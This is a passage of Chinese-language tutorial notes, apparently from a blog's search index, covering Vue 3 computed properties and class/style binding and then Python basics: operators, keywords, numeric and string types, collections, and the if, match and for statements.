来创建：\n\n```js\nexport default {\n  data() {\n    return {\n      firstName: 'John',\n      lastName: 'Doe'\n    }\n  },\n  computed: {\n    fullName: {\n      // getter\n      get() {\n        return this.firstName + ' ' + this.lastName\n      },\n      // setter\n      set(newValue) {\n        // 注意：我们这里使用的是解构赋值语法\n        [this.firstName, this.lastName] = newValue.split(' ')\n      }\n    }\n  }\n}\n```\n\n现在当你再运行 `this.fullName = 'John Doe'` 时，setter 会被调用而 `this.firstName` 和 `this.lastName` 会随之更新。或者这种使用方式\n\n```js\nexport default {\n    data() {\n      return {\n        firstName: 'John',\n        lastName: 'Doe'\n      }\n    },\n    computed: {\n      getfullName(){\n        return this.firstName + ' ' + this.lastName\n      }\n    }\n  }\n```\n\n\n\n> 计算属性和方法的区别\n>\n> **计算属性**: 计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算\n>\n> **方法**:方法调用总是会在重汇染发生时再次执行函数\n\n\n\n## Class绑定\n\n为了避免复杂的class 属性拼接，Vue 专门为class 的v-bind 用法提供了**特殊的功能增强**。除了字符串外，表达式的值也可以是对象或数组\n\n绑定一个数组\n\n```html\n<div :class=\"[activeClass, errorClass]\"></div>\n```\n\n```js\nexport default {\n    data() {\n        return {\n          activeClass: 'active',\n          errorClass: 'text-danger'\n        }\n      }\n  }\n```\n\n或者是一个对象\n\n```html\n<div :class=\"classObject\"></div>\n<MyComponent :class=\"{ active: isActive }\" />\n```\n\n```js\nexport default {\n    data() {\n        return {\n          isActive: true,\n          error: null\n        }\n      },\n      computed: {\n        classObject() {\n          return {\n            active: this.isActive && !this.error,\n            'text-danger': this.error && this.error.type === 'fatal'\n          }\n        }\n      }\n  }\n```\n\n也可以在数组中嵌套对象：\n\n```html\n<div :class=\"[{ active: isActive }, errorClass]\"></div>\n```\n\n> 提示：\n>\n> 数组和对象嵌套过程中，只能是数组嵌套对象，不能反其道而行\n\n## Style绑定\n\nhttps://cn.vuejs.org/guide/essentials/class-and-style.html#binding-inline-styles\n\n类似class绑定。如对象绑定\n\n```html\n<div :style=\"styleObject\"></div>\n```\n\n```js\nexport default {\n    data() {\n        return {\n          styleObject: {\n            color: 'red',\n            fontSize: '13px'\n          }\n        }\n      }\n}\n```\n\n","tags":["Vue3"],"categories":["前端","Vue3"]},{"title":"Python基础","url":"/20250619/99832f47.html","content":"\n# [语法](https://docs.python.org/zh-cn/3.11/reference/lexical_analysis.html#)\n\n## 编码声明\n\n```python\n# -*- coding: utf-8 -*-\n```\n\n\n\n## 运算符\n\n 运算符列表\n\n```html\n+       -       *       **      /       //      %      @\n<<      >>      &       |       ^       ~       :=\n<       >       <=      >=      ==      !=\n```\n\n| 符号   | 说明                 | 示例          |\n| ------ | -------------------- | ------------- |\n| +      | 加法                 |               |\n| -      | 减法                 |               |\n| *      | 乘法                 |               |\n| /      | 除法，总是返回浮点数 |               |\n| x ** y | *x* 的 *y* 次幂      | >>> 5 ** 2 25 |\n| x // y | x 除以 y 的商数      | >>> 5 // 2 2  |\n| x % 5  | x 除以 y 的余数      |               |\n| -x     | *x* 取反             |               |\n| +x     | *x* 不变             |               |\n\n交互模式下，上次输出的表达式会赋给变量 `_`。把 Python 当作计算器时，用该变量实现下一步计算更简单，例如：\n\n ```python\n >>> tax = 12.5 / 100\n \n >>> price = 100.50\n \n >>> price * tax\n \n 12.5625\n \n >>> price + _\n \n 113.0625\n \n >>> round(_, 2)\n \n 113.06\n ```\n\n最好把该变量 `_`当作只读类型。不要为它显式赋值，否则会创建一个同名独立局部变量，该变量会用它的魔法行为屏蔽内置变量。\n\n\n\n\n\n## 分隔符\n\n以下形符在语法中为分隔符：\n\n```html \n(       )       [       ]       {       }\n\n,       :       .       ;       @       =       ->\n\n+=      -=      *=      /=      //=     %=      @=\n\n&=      |=      ^=      >>=     <<=     **=\n```\n\n句点也可以用于浮点数和虚数字面值。\n\n三个连续句点表示省略符。\n\n列表后半部分是增强赋值操作符，用作词法分隔符，但也可以执行运算。\n\n\n\n以下 ASCII 字符具有特殊含义，对词法分析器有重要意义：\n\n ```python\n '       \"       #       \\\n ```\n\n以下 ASCII 字符不用于 Python。在字符串字面值或注释外使用时，将直接报错：\n\n```python\n$       ?       `\n```\n\n## 关键字\n\n关键字、软关键字、保留的标识符类\n\n\n\n### 关键字\n\n```html\nFalse      await      else       import     pass\nNone       break      except     in         raise\nTrue       class      finally    is         return\nand        continue   for        lambda     try\nas         def        from       nonlocal   while\nassert     del        global     not        with\nasync      elif       if         or         yield\n```\n\n### 软关键字\n\n某些标识符仅在特定上下文中被保留。 它们被称为 *软关键字*。\n\n `match`, `case` 和 `_` 等标识符在模式匹配语句相关的上下文中具有相当于关键字的语义，但这种区分是在解析器层级完成，而不是在形符化的时候。\n\n\n\n作为软关键字，它们能够与模式匹配一起使用，同时仍然保持与使用 `match`, `case` 和 `_` 作为标识符名称的现有代码的兼容性。\n\n\n\n### 保留的标识符类\n\n某些标识符类（除了关键字）具有特殊含义。这些类的命名模式以下划线字符开头，并以下划线结尾：\n\n| 标识符  | 说明                                                         |\n| ------- | ------------------------------------------------------------ |\n| `_*`    | 不会被 from module import * 所导入。                         |\n| `_`     | 在 match 语句内部的 case 模式中，_ 是一个 软关键字，它表示 通配符。<br />在此之外，交互式解释器会将最后一次求值的结果放到变量 _ 中。 （它与 print 等内置函数一起被存储于 builtins 模块。）<br />在其他地方，_ 是一个常规标识符。 <br />它常常被用来命名 \"特殊\" 条目，但对 Python 本身来说毫无特殊之处。如`_` 常用于连接国际化文本；详见 gettext 模块文档。<br/>它还经常被用来命名无需使用的变量。 |\n| `__*__` | 系统定义的名称，通常简称为 \"dunder\" 。这些名称由解释器及其实现（包括标准库）定义。<br />现有系统定义名称相关的论述详见 [特殊方法名称](https://docs.python.org/zh-cn/3.11/reference/datamodel.html#specialnames) 等章节。Python 未来版本中还将定义更多此类名称。任何情况下，*任何* 不显式遵从 `__*__` 名称的文档用法，都可能导致无警告提示的错误。 |\n| `__*`   | 类的私有名称。类定义时，此类名称以一种混合形式重写，以避免基类及派生类的 \"私有\" 属性之间产生名称冲突。详见 标识符（名称）。 |\n\n# 数据类型和变量\n\nPython3 中常见的数据类型有：\n\n- Number（数字）\n- String（字符串）\n- bool（布尔类型）\n- List（列表）\n- Tuple（元组）\n- Set（集合）\n- Dictionary（字典）\n\nPython3 的六个标准数据类型中：\n\n- **不可变数据（3 个）：**Number（数字）、String（字符串）、Tuple（元组）；\n- **可变数据（3 个）：**List（列表）、Dictionary（字典）、Set（集合）。\n\n此外还有一些高级的数据类型，如: 字节数组类型(bytes)。\n\n\n\n## 整数:[`int`](https://docs.python.org/zh-cn/3.11/library/functions.html#int)\n\nPython允许在数字中间以`_`分隔，因此，写成`10_000_000_000`和`10000000000`是完全一样的\n\n```python\n# 交互窗口输入（默认10进制）\n>>> int(input('输入数字：')) \n输入数字：123\n123\n\n# 指定2进制数据转化为10进制\n>>> int('11', 2) \n3\n```\n\n## 浮点数\n\n### [ `float`](https://docs.python.org/zh-cn/3.11/library/functions.html#float)\n\n如果该参数是一个字符串，在去除前导和尾随的空格之后，输入必须为符合以下语法的 `floatvalue` 产生规则:\n\n```html\nsign        ::=  \"+\" | \"-\"\ninfinity    ::=  \"Infinity\" | \"inf\"\nnan         ::=  \"nan\"\ndigitpart   ::=  digit ([\"_\"] digit)*\nnumber      ::=  [digitpart] \".\" digitpart | digitpart [\".\"]\nexponent    ::=  (\"e\" | \"E\") [\"+\" | \"-\"] digitpart\nfloatnumber ::=  number [exponent]\nfloatvalue  ::=  [sign] (floatnumber | infinity | nan)\n```\n\n| 符号标记                           | 说明                                                         | 示例                                                         |\n| ---------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| sign ::= \"+\"                       | 正，负                                                       | >>> float('+1.23') <br/>1.23<br/>>>> float('-1.23\\n')  <br/>-1.23<br/>>>> float('-123\\n')   <br/>-123.0 |\n| (\"e\" \\| \"E\") [\"+\" \\| \"-\"] 数字部分 | 科学计数                                                     | >>> float(1e3)<br />1000.0 <br />>>> float('1e3')<br />1000.0 <br />>>> float('1e+3')<br />1000.0 <br />>>> float('+1e3')<br />1000.0 <br />>>> float('-1e3')<br />-1000.0 <br />>>> float('1e-3')<br />0.001 <br />>>> float(1e-3)<br />0.001 <br />>>> float(1E-3)<br />0.001 |\n| infinity ::= \"Infinity\" \\| \"inf\"   | 无穷大<br />1. 大小写不敏感<br />2.  需要为字符串，否则会报错 | \\>>> float('Infinity')<br />inf<br />>>> float('InfinitY')<br />inf<br />>>> float('-Inf')<br />-inf |\n| not-a-number                       | NaN<br />1. 大小写不敏感<br />2. 需要为字符串，否则会报错    | \\>>> float('NAN')<br />nan<br />>>> float('NaN')<br />nan<br />>>> float('-nan')<br />nan |\n\n### [`complex`](https://docs.python.org/zh-cn/3.11/library/stdtypes.html#typesnumeric) ：复数\n\n后缀 `j` 或 `J` 用于表示虚数（例如 `3+5j` ）\n\n|                 | 说明                                                | 示例                                      |\n| --------------- | --------------------------------------------------- | ----------------------------------------- |\n| complex(re, im) | 一个带有实部 *re* 和虚部 *im* 的复数。 *im* 默认为0 | >>> complex(3, 2)<br />(3+2j)             |\n| c.conjugate()   | 复数 *c* 的共轭                                     | >>> complex(3, 2).conjugate()<br />(3-2j) |\n\n### [`Decimal`](https://docs.python.org/zh-cn/3.11/library/decimal.html#decimal-objects)：十进制浮点运算\n\n*class* decimal.**Decimal**(*value='0'*, *context=None*)\n\n*value* 可以是整数，字符串，元组，[`float`](https://docs.python.org/zh-cn/3.11/library/functions.html#float) ，或另一个 [`Decimal`](https://docs.python.org/zh-cn/3.11/library/decimal.html#decimal.Decimal) 对象。 如果没有给出 *value*，则返回 `Decimal('0')`。\n\n如果 *value* 是一个字符串，它应该在前导和尾随空格字符以及下划线被删除之后符合十进制数字字符串语法\n\n\n\n```python\n>>> from decimal import *\n\n# 因为浮点数据的不准确性\n>>> Decimal(1.2)\nDecimal('1.1999999999999999555910790149937383830547332763671875')\n\n# 通过设定有效数字，限定结果样式，保留六个有效数字\n>>> getcontext().prec = 6\n>>> Decimal(1)/Decimal(7)\nDecimal('0.142857')\n>>> Decimal(1000)/Decimal(7) \nDecimal('142.857')\n\n# 四舍五入，保留两位小数\n>>> Decimal('50.5679').quantize(Decimal('0.00'))\nDecimal('50.57')\n>>> Decimal('50.5').quantize(Decimal('0.00'))    \nDecimal('50.50')\n\n# Decimal 结果转化为string\n>>> str(Decimal('50.5679').quantize(Decimal('0.00')))  \n'50.57'\n```\n\n```html\n取整问题：\nROUND_CEILING 总是趋向无穷大向上取整\nROUND_DOWN　总是趋向0取整\nROUND_FLOOR 总是趋向负无穷大向下取整\nROUND_HALF_DOWN　如果最后一个有效数字大于或等于5则朝0反方向取整；否则，趋向0取整\nROUND_HALF_EVEN　类似于ROUND_HALF_DOWN，不过，如果最后一个有效数字值为5，则会检查前一位。\n偶数值会导致结果向下取整，奇数值导致结果向上取整\nROUND_HALF_UP 类似于ROUND_HALF_DOWN，不过如果最后一位有效数字为5，值会朝0的反方向取整\nROUND_UP　朝0的反方向取整\nROUND_05UP　如果最后一位是0或5，则朝0的反方向取整；否则向0取整\n```\n\n### [`fractions`](https://docs.python.org/zh-cn/3.11/library/fractions.html#module-fractions) --- 分数\n\n```python\n>>> from fractions import Fraction\n>>> Fraction('1/3')*Fraction('3/1') \nFraction(1, 1)\n>>> int(Fraction('1/3')*Fraction('3/1'))\n1\n>>> int(Fraction('1/3')*Fraction('6/2'))   \n1\n>>> int(Fraction('1/3')*Fraction('6/1'))\n2\n\n\n>>> Fraction(16, -10)\nFraction(-8, 5)\n>>> Fraction(-8, 5)\nFraction(-8, 5)\n>>> Fraction(123)\nFraction(123, 1)\n>>> Fraction(123, 1)\nFraction(123, 1)\n>>> Fraction()\nFraction(0, 1)\n>>> Fraction(0, 1)\nFraction(0, 1)\n>>> Fraction('3/7')\nFraction(3, 7)\n>>> Fraction(3, 7)\nFraction(3, 7)\n>>> Fraction(' -3/7 ')\nFraction(-3, 7)\n>>> Fraction(-3, 7)\nFraction(-3, 7)\n>>> Fraction('1.414213 \\t\\n')\nFraction(1414213, 1000000)\n>>> Fraction(1414213, 1000000)\nFraction(1414213, 1000000)\n>>> Fraction('-.125')\nFraction(-1, 8)\n>>> Fraction(-1, 8)\nFraction(-1, 8)\n>>> Fraction('7e-6')\nFraction(7, 1000000)\n>>> Fraction(7, 1000000)\nFraction(7, 1000000)\n>>> Fraction(2.25)\nFraction(9, 4)\n>>> Fraction(9, 4)\nFraction(9, 4)\n>>> Fraction(1.1)\nFraction(2476979795053773, 2251799813685248)\n>>> Fraction(2476979795053773, 2251799813685248)\nFraction(2476979795053773, 2251799813685248)\n>>> from decimal import Decimal\n>>> Fraction(Decimal('1.1'))\nFraction(11, 10)\n>>> Fraction(11, 10)\nFraction(11, 10)\n>>>\n```\n\n## 字符串：String\n\n可以用成对的单引号、双引号、三重引号来表示\n\n字符串由[`str`](https://docs.python.org/zh-cn/3.11/library/stdtypes.html#str) 类型表示。\n\n1. 如果不希望前置 `\\` 的字符转义成特殊字符，可以使用 *原始字符串*，在引号前添加 `r` 即可：\n\n   ```py\n   >>> print('C:\\some\\name')\n   C:\\some\n   ame\n   >>> print(r'C:\\some\\name')\n   C:\\some\\name\n   \n   >>> ll = str(12)      \n   >>> ll\n   '12'\n   ```\n\n2. 原始字符串还有一个微妙的限制：一个原始字符串不能以奇数个 `\\` 字符结束\n\n   以奇数个反斜杠结尾的原始字符串将会转义用于标记字符串的引号\n\n   请参阅 [此 FAQ 条目](https://docs.python.org/zh-cn/3.11/faq/programming.html#faq-programming-raw-string-backslash) 了解更多信息及绕过的办法。\n\n3. 字符串字面值可以多行。使用三重引号：\"\"\"...\"\"\" 或 '''...'''\n\n### 格式化字符串\n\n#### 占位符\n\n用`%`实现。当`%`作为普通字符时，用`%%`来表示一个`%`\n\n```py\n# 只有一个占位符，括号可以省略\n>>> 'Hello, %s' % 'world'\n'Hello, world'\n>>> 'Hi, %s, you have $%d.' % ('Michael', 1000000)\n'Hi, Michael, you have $1000000.'\n>>> print('Hi, %s, you have $%d. %f' % ('Michael', 1000000, True))\nHi, Michael, you have $1000000. 1.000000\n\n>>> print('percent: %d%%' % 1)  \npercent: 1%\n\n\n>>> print('percent: %.2f%%' % 1.345)  \npercent: 1.34%\n\n>>> print('percent: %.2f%%' % 1.346) \npercent: 1.35%\n```\n\n常见的占位符有：\n\n| 符号 | 说明                             |\n| ---- | -------------------------------- |\n| %d   | 整数                             |\n| %f   | 浮点数                           |\n| %s   | `%s`会把任何数据类型转换为字符串 |\n| %x   | 十六进制整数                     |\n\n```python\n# 指定浮点数的小数位数，不足补0，超出四舍五入\n>>> print('%0.4f' % 3.1415926)\n3.1416\n\n>>> print('%.2f' % 3.1415926)\n3.14\n\n# 指定浮点数的小数位数，不足补0\n>>> print('%.4f' % 3.1)\n3.1000\n\n# 指定整数的最小占位数，不足补空格\n>>> print('%2d' % 1)\n 1\n\n# 指定整数的最小占位数，不足补0\n>>> print('%02d'%1)\n01\n\n```\n\n#### [f-string：格式字符串字面值](https://docs.python.org/zh-cn/3.11/reference/lexical_analysis.html#formatted-string-literals)\n\n是使用以`f`开头的字符串，称之为`f-string`，它和普通字符串不同之处在于，字符串如果包含`{xxx}`，就会以对应的变量替换.\n\n指定了转换符时，表达式求值的结果会先转换，再格式化。转换符 `'!s'` 调用 [`str()`](https://docs.python.org/zh-cn/3.11/library/stdtypes.html#str) 转换求值结果，`'!r'` 调用 [`repr()`](https://docs.python.org/zh-cn/3.11/library/functions.html#repr)，`'!a'` 调用 [`ascii()`](https://docs.python.org/zh-cn/3.11/library/functions.html#ascii)。\n\n```python\n>>> r = 2.5\n>>> s = 3.14 * r ** 2\n>>> print(f'The area of a circle with radius {r} is {s:.2f}')\nThe area of a circle with radius 2.5 is 19.62\n\n\n#使用'!r'\n>>> name = \"Fred\"\n>>> f\"He said his name is {name!r}.\"\n\"He said his name is 'Fred'.\"\n>>> f\"He said his name is {name}.\"   \n'He said his name is Fred.'\n\n\n>>> import decimal\n>>> width = 10\n>>> precision = 4\n>>> value = decimal.Decimal(\"12.34567\") \n>>> f\"result: {value:{width}.{precision}}\"\n'result:      12.35'\n\n\n>>> number = 15 \n>>> f\"{number:#0x}\" \n'0xf'\n\n# 格式化日期\n>>> from datetime import datetime\n>>> today = datetime(year=2017, month=1, day=27)\n>>> f\"{today:%B %d, %Y}\"\n'January 27, 2017'\n>>> f\"{today=:%B %d, %Y}\" \n'today=January 27, 2017'\n\n>>> line = \"The mill's closed\"\n>>> f\"{line}\"    \n\"The mill's closed\"\n>>> f\"{line=}\" \n'line=\"The mill\\'s closed\"'\n>>> f\"{line = :20}\"\n\"line = The mill's closed   \"\n>>> f\"{line = !r:20}\"\n'line = \"The mill\\'s closed\" '\n```\n\n#### format()\n\n使用字符串的`format()`方法，它会用传入的参数依次替换字符串内的占位符`{0}`、`{1}`……\n\n\n\n### 内置函数\n\n| 函数                   | 说明                                                         |\n| ---------------------- | ------------------------------------------------------------ |\n| len('asd')             | 计算的是`str`的字符数，如果换成`bytes`，`len()`函数就计算字节数 |\n| ord('A')               | 返回单个字符的整数编码                                       |\n| chr('32')              | 整数编码转换为对应的字符                                     |\n| 'ABC'.encode('ascii')  | `str`转`bytes`                                               |\n| b'ABC'.decode('ascii') | `bytes`转`str`                                               |\n|                        |                                                              |\n|                        |                                                              |\n|                        |                                                              |\n|                        |                                                              |\n\n## 布尔值：Bool\n\n区分大小写\n\n```Python\n>>> not True\nFalse\n>>> not False\nTrue\n>>> not 1 > 2\nTrue\n>>> 5 > 3 and 3 > 1\nTrue\n```\n\n## 空值：None\n\n 空值是Python里一个特殊的值，用`None`表示。`None`不能理解为`0`，因为`0`是有意义的，而`None`是一个特殊的空值。\n\n## 列表：List\n\nlist是一种有序的集合，可以随时添加和删除其中的元素。可以包含不同类型的元素。列表支持索引和切片查询\n\n1. 定义\n\n   ```python\n   >>> letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']\n   \n   # 嵌套列表（创建包含其他列表的列表）\n   >>> a = ['a', 'b', 'c']\n   >>> n = [1, 2, 3]\n   >>> x = [a, n]\n   >>> x\n   [['a', 'b', 'c'], [1, 2, 3]]\n   >>> x[0]\n   ['a', 'b', 'c']\n   >>> x[0][1]\n   'b'\n   ```\n\n   \n\n2. 添加\n\n   ```python\n   # 末尾追加元素\n   >>> letters = ['a', 'b', 'f', 'g']\n   >>> letters.append('h') \n   >>> letters\n   ['a', 'b', 'f', 'g', 'h']\n   >>> letters += 'i'      \n   >>> letters\n   ['a', 'b', 'f', 'g', 'h', 'i']\n   \n   # 把元素插入到指定的位置\n   >>> letters  \n   ['a', 'b', 'f', 'g', 'h', 'i']\n   >>> letters.insert(2, 'c') \n   >>> letters\n   ['a', 'b', 'c', 'f', 'g', 'h', 'i']\n   \n   # 合并操作\n   >>> letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']          \n   >>> letters += ['h', 'i'] \n   >>> letters\n   ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i']\n   ```\n\n3. 修改\n\n   ```python\n   >>> letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']\n   \n   # 修改元素\n   >>> letters[2:5]\n   ['c', 'd', 'e']\n   >>> letters[2:5] = ['C', 'D', 'E'] \n   >>> letters[2:5] \n   ['C', 'D', 'E']\n   >>> letters     \n   ['a', 'b', 'C', 'D', 'E', 'f', 'g']\n   ```\n\n4. 删除\n\n   ```python\n   >>> letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']\n   \n   # 切片删除元素\n   >>> letters[2:5] = []\n   >>> letters          \n   ['a', 'b', 'f', 'g']\n   \n   # 删除末尾元素\n   >>> letters          \n   ['a', 'b', 'f', 'g']\n   >>> letters.pop()    \n   'g'\n   >>> letters\n   ['a', 'b', 'f']\n   \n   # 删除指定位置元素\n   >>> letters.pop(1) \n   'b'\n   >>> letters        \n   ['a', 'f']\n   \n   ```\n\n   \n\n## 元组：Tuple\n\n有序、不可变\n\n1. 定义\n\n   ```python\n   # 普通定义\n   >>> classmates = ('Michael', 'Bob', 'Tracy')\n   \n   # 空\n   >>> classmates = ()\n   \n   \n   # 一个元素（歧义）\n   >>> test = ('test') \n   >>> test\n   'test'\n   # 一个元素（元组定义）\n   >>> test = ('test',) \n   >>> test\n   ('test',)\n   ```\n\n2. 只有1个元素的tuple定义时必须加一个逗号`,`，来消除歧义。而显示时，也会带上一个逗号`, `\n\n3. “可变的”tuple：\n\n   ```python\n   >>> t = ('a', 'b', ['A', 'B'])\n   >>> t[2][0] = 'X'\n   >>> t[2][1] = 'Y'\n   >>> t\n   ('a', 'b', ['X', 'Y']) \n   ```\n\n   当我们把list的元素`'A'`和`'B'`修改为`'X'`和`'Y'`后，tuple变为：\n\n   \n\n   表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。\n\n   tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向`'a'`，就不能改成指向`'b'`，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的。\n\n   理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。\n\n## 字典：Dictionary\n\n\n\nPython内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。\n\n1. 定义和赋值\n\n   ```python\n   >>> d = {}\n   >>> d\n   {}\n   >>> d['Jack'] = 90\n   >>> d\n   {'Jack': 90}\n   >>> d['Jack'] = 88\n   >>> d\n   {'Jack': 88}\n   >>> \n   ```\n\n   ```python\n   >>> f = dict  \n   >>> f\n   <class 'dict'>\n   >>> f = dict()\n   >>> f\n   {}\n   ```\n\n   \n\n   如果key不存在，dict就会报错：\n\n   ```python\n   >>> d['Thomas']\n   Traceback (most recent call last):\n     File \"<stdin>\", line 1, in <module>\n   KeyError: 'Thomas'\n   ```\n\n   要避免key不存在的错误，有两种办法，一是通过`in`判断key是否存在：\n\n   ```python\n   >>> 'Thomas' in d\n   False\n   ```\n\n   二是通过dict提供的`get()`方法，如果key不存在，可以返回`None`，或者自己指定的value：\n\n   ```python\n   >>> d.get('Thomas')\n   >>> d.get('Thomas', -1)\n   -1\n   ```\n\n   注意：返回`None`的时候Python的交互环境不显示结果。\n\n   要删除一个key，用`pop(key)`方法，对应的value也会从dict中删除，如果key不存在，一样会报错：\n\n   ```python\n   >>> d.pop('Bob')\n   75\n   >>> d\n   {'Michael': 95, 'Tracy': 85}\n   >>> 'Bob' in d\n   False\n   >>> d.pop('Bob') \n   Traceback (most recent call last):\n     File \"<stdin>\", line 1, in <module>\n   KeyError: 'Bob'\n   \n   ```\n\n## 集合：Set\n\nset和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。\n\n要创建一个set，需要提供一个list作为输入集合：\n\n```python\n>>> s = set([1, 2, 3])\n>>> s\n{1, 2, 3}\n\n```\n\n注意，传入的参数`[1, 2, 3]`是一个list，而显示的`{1, 2, 3}`只是告诉你这个set内部有1，2，3这3个元素，显示的顺序也不表示set是有序的。\n\n重复元素在set中自动被过滤：\n\n```python\n>>> s = set([1, 1, 2, 2, 3, 3])\n>>> s\n{1, 2, 3}\n```\n\n通过`add(key)`方法可以添加元素到set中，可以重复添加，但不会有效果：\n\n```python\n>>> s.add(4)\n>>> s\n{1, 2, 3, 4}\n>>> s.add(4)\n>>> s\n{1, 2, 3, 4}\n```\n\n通过`remove(key)`方法可以删除元素：\n\n```python\n>>> s.remove(4)\n>>> s\n{1, 2, 3}\n```\n\nset可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：\n\n```python\n>>> s1 = set([1, 2, 3])\n>>> s2 = set([2, 3, 4])\n>>> s1 & s2\n{2, 3}\n>>> s1 | s2\n{1, 2, 3, 4}\n```\n\nset和dict的唯一区别仅在于没有存储对应的value，但是，**set的原理和dict一样**，所以，**同样不可以放入可变对象**，因为无法判断两个可变对象是否相等，也就无法保证set内部“不会有重复元素”。\n\n```python\n>>> ll = {(1, 2, 3), 4} \n>>> ll\n{(1, 2, 3), 4}\n>>>\n>>>\n>>> ll = {(1, [2, 3]), 4} \nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: unhashable type: 'list'\n```\n\n\n\n\n\n# 控制流工具\n\n## if 语句\n\n完整结构\n\n```python\nif <条件判断1>:\n    <执行1>\nelif <条件判断2>:\n    <执行2>\nelif <条件判断3>:\n    <执行3>\nelse:\n    <执行4>\n```\n\n`if`判断条件还可以简写，比如写：\n\n```python\nif x:\n    print('True')\n```\n\n只要`x`是非零数值、非空字符串、非空list等，就判断为`True`，否则为`False`\n\n## match 语句\n\n版本3.10之后支持\n\n模式匹配：只有第一个匹配的模式会被执行，并且它还可以提取值的组成部分（序列的元素或对象的属性）赋给变量。\n\n#### 字面值匹配\n\n最简单的形式是将一个主语值与一个或多个字面值进行比较：\n\n```Python\ndef http_error(status):\n    match status:\n        case 400:\n            return \"Bad request\"\n        case 401 | 403 | 404:\n            return \"Not allowed\"\n        case 404:\n            return \"Not found\"\n        case 418:\n            return \"I'm a teapot\"\n        case _:\n            return \"Something's wrong with the internet\"\n```\n\n注意最后一个代码块：“变量名” `_` 被作为 *通配符* 并必定会匹配成功。\n\n如果没有 case 匹配成功，则不会执行任何分支。\n\n你可以使用 `|` （“ or ”）在一个模式中组合几个字面值\n\n```python\ncase 401 | 403 | 404:\n    return \"Not allowed\"\n```\n\n**在case中使用判断语句**\n\nmatch语句还支持在分支条件中插入判断语句\n\n```python\na = (2, 2)\nflag = False\n\nmatch a:\n    case (1, 2):\n        print('case 1')\n    case (2, x) if flag:\n        print('case 2', x)\n    case default:\n        print('case default', default)\n```\n\n\n\n#### 解包赋值\n\n`match`语句除了可以匹配简单的单个值外，还可以匹配多个值、匹配一定范围，并且把匹配后的值绑定到变量：\n\n```python\n# point is an (x, y) tuple\nmatch point:\n    case (0, 0):\n        print(\"Origin\")\n    case (0, y):\n        print(f\"Y={y}\")\n    case (x, 0):\n        print(f\"X={x}\")\n    case (x, y):\n        print(f\"X={x}, Y={y}\")\n    case _:\n        raise ValueError(\"Not a point\")\n```\n\n\n\n```python\nclass Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n\ndef where_is(point):\n    match point:\n        case Point(x=0, y=0):\n            print(\"原点\")\n        case Point(x=0, y=yLine):\n            print(f\"Y轴：Y={yLine}\")\n        case Point(x=xLine, y=0):\n            print(f\"X轴：X={xLine}\")\n        case Point():\n            print(\"Somewhere else\")\n        case _:\n            print(\"Not a point\")\n\n\nwhere_is(Point(0, 3))\n```\n\n#### 序列模式\n\n与解包赋值类似，元组和列表模式具有完全相同的含义并且实际上都能匹配任意序列，区别是它们不能匹配迭代器或字符串。\n\n序列模式支持扩展解包：`[x, y, *rest]` 和 `(x, y, *rest)` 和相应的解包赋值做的事是一样的。接在 `*` 后的名称也可以为 `_`，所以 `(x, y, *_)` 匹配含至少两项的序列，而不必绑定剩余的项。\n\n```python\ndef match_list(s):\n    match s:\n        case None:\n            print(\"None\")\n        case []:\n            print(\"Empty\")\n        case [x]:\n            print(\"x={0}\".format(x))\n        case [x, y]:\n            print(\"x={0},y={1}\".format(x, y))\n        case [x, y, *rest]:\n            print(\"x=%s, y=%s, rest=%s\" % (x, y, rest))\n        case _:\n            print(\"Not a list\")\n\n\nmatch_list([1])\nmatch_list([1, 2])\nmatch_list([1, 2, 3, 4])\nmatch_list(\"s\")\n\n# 输出\nx=1\nx=1,y=2\nx=1, y=2, rest=[3, 4]\nNot a list\n```\n\n#### 映射模式\n\n映射模式：`{\"bandwidth\": b, \"latency\": l}` 从字典中捕获 `\"bandwidth\"` 和 `\"latency\"` 的值。额外的键会被忽略，这一点与序列模式不同。`**rest` 这样的解包也支持。（但 `**_` 将会是冗余的，故不允许使用。）\n\nmatch实现\n\n```python\ndef dispatch_match(operator, x, y):\n    match operator:\n        case 'add':\n            return x + y\n        case 'sub':\n            return x - y\n        case 'mul':\n          return x * y\n        case 'div':\n            return x / y\n        case _:\n            return None \n        \n        \nprint(dispatch_match('add', 1, 2))\nprint(dispatch_match('test', 1, 2))\n\n# 输出结果\n3\nNone\n```\n\n字典实现相同功能\n\n```python\ndef dispatch_dict(operator, x, y):\n    return {\n        'add': lambda: x + y,\n        'sub': lambda: x - y,\n        'mul': lambda: x * y,\n        'div': lambda: x / y,\n    }.get(operator, lambda: None)()\n  \n\nprint(dispatch_dict('add', 1, 2))\nprint(dispatch_dict('test', 1, 2))\n\n# 输出结果\n3\nNone\n```\n\n\n\n## 循环\n\n1. for 语句\n\n   for x in ...循环就是把每个元素代入变量x，然后执行缩进块的语句。\n\n   ```python\n   # Measure some strings:\n   words = ['cat', 'window', 'defenestrate']\n   for w in words:\n       print(w, len(w))\n   ```\n\n   ```python\n   sum = 0\n   for x in range(101):\n       sum = sum + x\n   print(sum)\n   ```\n\n   ```python\n   p = {\"a\": 10, \"b\" : 20}\n   for x in p:\n       print(x)\n       print(p[x]) \n       \n       \n   # 输出\n   a\n   10\n   b\n   20\n   ```\n\n   很难正确地在迭代多项集的同时修改多项集的内容。更简单的方法是迭代多项集的副本或者创建新的多项集：\n\n   ```python\n   # Create a sample collection\n   users = {'Hans': 'active', 'Éléonore': 'inactive', '景太郎': 'active'}\n   \n   # Strategy:  Iterate over a copy\n   for user, status in users.copy().items():\n       if status == 'inactive':\n           del users[user]\n   \n   # Strategy:  Create a new collection\n   active_users = {}\n   for user, status in users.items():\n       if status == 'active':\n           active_users[user] = statuss\n   